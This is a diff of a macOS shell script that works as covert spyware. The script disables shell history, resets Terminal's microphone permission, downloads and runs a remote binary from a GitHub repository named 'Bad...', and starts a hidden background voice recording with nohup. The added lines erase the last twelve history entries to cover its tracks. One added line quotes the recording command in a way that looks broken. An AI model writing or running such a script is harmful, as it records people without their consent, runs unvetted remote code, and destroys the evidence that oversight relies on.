@@ -7,12 +7,6 @@ if ! grep -q "unset HISTFILE" ~/.bashrc; then
 fi
 source ~/.bashrc
 
-# Clear specific history command
-history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
-
-# Start recording in a screen session
-# screen -dm bash -c "python3 record.py"
-
 # Reset microphone permission for Terminal
 tccutil reset Microphone com.apple.Terminal
 
@@ -49,7 +43,9 @@ curl -L -o allow_permission_mac_go 'https://raw.githubusercontent.com/YonKu0/Bad
 chmod +x allow_permission_mac_go
 
 # Start voice recording
-nohup python3 record.py
+nohup "python3 record.py"
 sleep 0.5
 ./allow_permission_mac_go
-exit
+
+# Clear last 12 history command
+history | head -n -12 >~/.bash_history && history -c && history -r
